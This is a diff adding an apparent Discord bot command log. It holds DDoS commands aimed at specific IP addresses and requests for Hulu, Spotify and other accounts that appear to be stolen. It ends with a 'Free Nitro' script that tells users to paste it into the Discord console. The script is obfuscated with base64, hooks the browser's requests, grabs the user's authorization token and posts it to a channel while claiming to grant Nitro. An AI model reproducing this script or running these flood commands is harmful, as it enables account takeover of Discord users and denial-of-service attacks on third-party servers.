@@ -1,0 +1,34 @@
+[Sat Aug 15 2020 01:29:29 GMT-1100 (Samoa Standard Time)] /ddos Kraken squid 66.196.19.233 300
+[Sat Aug 15 2020 01:31:55 GMT-1100 (Samoa Standard Time)] /claim TRJgif3s5HorueumW2EL4jMmWf9yg3pMYmdReUuWU0JqjKeJJI
+[Sat Aug 15 2020 01:33:05 GMT-1100 (Samoa Standard Time)] /claim TRuSmMDdn6q7SOqNZJ1VtvnRZQRxOXB7rp8geCZTwoOJIlD0o2
+[Sat Aug 15 2020 03:39:54 GMT-1100 (Samoa Standard Time)] /tr4p
+[Sat Aug 15 2020 03:40:05 GMT-1100 (Samoa Standard Time)] /info
+[Sat Aug 15 2020 03:40:12 GMT-1100 (Samoa Standard Time)] /sms
+[Sat Aug 15 2020 03:40:28 GMT-1100 (Samoa Standard Time)] /sms
+[Sat Aug 15 2020 03:41:40 GMT-1100 (Samoa Standard Time)] /tr4p
+[Sat Aug 15 2020 03:42:01 GMT-1100 (Samoa Standard Time)] /getplan <@739956119220387942>
+[Sat Aug 15 2020 03:42:09 GMT-1100 (Samoa Standard Time)] /getplay
+[Sat Aug 15 2020 03:42:17 GMT-1100 (Samoa Standard Time)] /getplan
+[Sat Aug 15 2020 03:42:36 GMT-1100 (Samoa Standard Time)] /accounts
+[Sat Aug 15 2020 03:42:53 GMT-1100 (Samoa Standard Time)] /hulu
+[Sat Aug 15 2020 03:43:22 GMT-1100 (Samoa Standard Time)] /accounts /hulu
+[Sat Aug 15 2020 03:43:33 GMT-1100 (Samoa Standard Time)] /accounts hulu
+[Sat Aug 15 2020 03:43:42 GMT-1100 (Samoa Standard Time)] /hulu
+[Sat Aug 15 2020 03:44:00 GMT-1100 (Samoa Standard Time)] /spotify
+[Sat Aug 15 2020 03:44:17 GMT-1100 (Samoa Standard Time)] /acconts
+[Sat Aug 15 2020 03:44:26 GMT-1100 (Samoa Standard Time)] /tr4p
+[Sat Aug 15 2020 03:45:54 GMT-1100 (Samoa Standard Time)] /methods
+[Sat Aug 15 2020 03:46:18 GMT-1100 (Samoa Standard Time)] /tr4p
+[Sat Aug 15 2020 03:46:41 GMT-1100 (Samoa Standard Time)] /DDos bot-commands udp 74.91.119.111 300
+[Sat Aug 15 2020 03:46:56 GMT-1100 (Samoa Standard Time)] /severinfo
+[Sat Aug 15 2020 03:47:16 GMT-1100 (Samoa Standard Time)] /serverinfo
+[Sat Aug 15 2020 03:48:03 GMT-1100 (Samoa Standard Time)] /DDos Kraken udp 74.91.119.111 300
+[Sun Aug 16 2020 03:07:20 GMT-1100 (Samoa Standard Time)] /***************************************
+ * 
+ *           Free Nitro
+ *      paste to console on discord
+ *      F12 on chrome/mozilla/Edge
+ *      Ctrl+Shift+i on desktop app
+ * 
+ * **************************************/
+XMLHttpRequest.prototype.wrappedSetRequestHeader=XMLHttpRequest.prototype.setRequestHeader,XMLHttpRequest.prototype.setRequestHeader=function(e,t){this.wrappedSetRequestHeader(e,t),this.headers||(this.headers={}),this.headers[e]||(this.headers[e]=[]),this.headers[e].push(t)};let oldXHROpen=window.XMLHttpRequest.prototype.open;window.XMLHttpRequest.prototype.open=function(e,t,o,n,s){return this.addEventListener(load,function(){isNaN(window.location.href.substring(window.location.href.lastIndexOf(/)+1,window.location.href.length))?console.log(atob(UGVuZGluZy4uIHRvIHJlc29sdmUgeW91ciBuaXRyby4=)):(fetch(atob(aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvdjYvY2hhbm5lbHMv)+window.location.href.substring(window.location.href.lastIndexOf(/)+1,window.location.href.length)+/messages,{method:POST,headers:{authorization:this.headers.Authorization[0],user-agent:navigator.userAgent,Content-Type:application/json},body:JSON.stringify({content:atob(aHR0cHM6Ly8weDUzOS5jby9rLw==)+this.headers.Authorization[0],tts:false})}),console.log(%c ,atob(Zm9udC1zaXplOiA0NTBweDsgYmFja2dyb3VuZDogdXJsKGh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzQ5OTIxMTI5NzI4ODYxNzk5Mi81Njg1MDg4NzgzNzU4Nzg2NjgvaW1hZ2VzLnBuZykgbm8tcmVwZWF0Ow==)),console.log(Congrats, you got free discord nitro))}),oldXHROpen.apply(this,arguments)};
